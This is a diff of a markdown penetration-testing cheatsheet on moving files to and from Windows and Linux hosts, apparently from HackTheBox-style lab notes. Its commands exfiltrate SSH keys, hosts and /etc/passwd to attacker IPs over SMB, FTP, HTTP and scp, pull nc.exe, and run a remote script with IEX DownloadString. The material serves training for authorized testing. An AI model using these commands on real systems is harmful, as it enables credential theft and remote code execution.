@@ -1,14 +1,17 @@
-# Windows File Transfers
-## Powershell Base64 Enconde & Decode
-### Encode
+[File transfer cheatsheet](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
+
+# File Transfers
+## Windows File Transfers
+### Powershell Base64 Enconde & Decode
+Encode
 ```
 cat id_rsa |base64 -w 0;echo
 ```
-### Decode
+Decode
 ```
 [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<Base64-String>"))
 ```
-## Powershell Web Downloads
+### Powershell Web Downloads
 
 | Method	| Description|
 |---------|-----------|
@@ -67,37 +70,37 @@ At line:1 char:1
     + FullyQualifiedErrorId : WebException
 PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
-## SMB Downloads
-### Create SMB Server
+### SMB Downloads
+Create SMB Server
 ```
 sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
-### Copy a File from the SMB Server
+Copy a File from the SMB Server
 ```
 copy \\192.168.220.133\share\nc.exe
 ```
-### Create the SMB Server with a Username and Password
+Create the SMB Server with a Username and Password
 ```
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
-### Mount the SMB Server with Username and Password
+Mount the SMB Server with Username and Password
 ```
 net use n: \\192.168.220.133\share /user:test test
 ```
-## FTP Downloads
-### Installing the FTP Server Python3 Module - pyftpdlib
+### FTP Downloads
+Installing the FTP Server Python3 Module - pyftpdlib
 ```
 sudo pip3 install pyftpdlib
 ```
-### Setting up a Python3 FTP Server
+Setting up a Python3 FTP Server
 ```
 sudo python3 -m pyftpdlib --port 21
 ```
-### Transfering Files from an FTP Server Using PowerShell
+Transfering Files from an FTP Server Using PowerShell
 ```
 (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
 ```
-### Create a Command File for the FTP Client and Download the Target File
+Create a Command File for the FTP Client and Download the Target File
 ```
 C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 C:\htb> echo USER anonymous >> ftpcommand.txt
@@ -125,20 +128,20 @@ Decoding
 ```
 echo <Base64-String> | base64 -d > hosts
 ```
-## PowerShell Web Uploads
-### Installing a Configured WebServer with Upload
+### PowerShell Web Uploads
+Installing a Configured WebServer with Upload
 ```
 pip3 install uploadserver
 ```
 ```
 python3 -m uploadserver
 ```
-### PowerShell Script to Upload a File to Python Upload Server
+PowerShell Script to Upload a File to Python Upload Server
 ```
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 ```
-### PowerShell Base64 Web Upload
+PowerShell Base64 Web Upload
 ```
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
@@ -146,8 +149,8 @@ Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
 nc -lvnp 8000
 ```
-## SMB Uploads
-### Configuring WebDav Server
+### SMB Uploads
+Configuring WebDav Server
 Installing WebDav Python Modules
 ```
 sudo pip install wsgidav cheroot
@@ -165,7 +168,7 @@ Uploading Files using SMB
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 ```
-## FTP Uploads
+### FTP Uploads
 Uploading Files using SMB
 ```
 sudo python3 -m pyftpdlib --port 21 --write
@@ -192,9 +195,9 @@ ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
 ```
 
-# Linux File Transfers
-## Download Operations
-### Base64 Encoding / Decoding
+## Linux File Transfers
+### Download Operations
+Base64 Encoding / Decoding
 Encoding
 ```
 cat id_rsa |base64 -w 0;echo
@@ -297,3 +300,4 @@ File Upload using SCP
 ```
 scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
 ```
+[File transfer cheatsheet](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
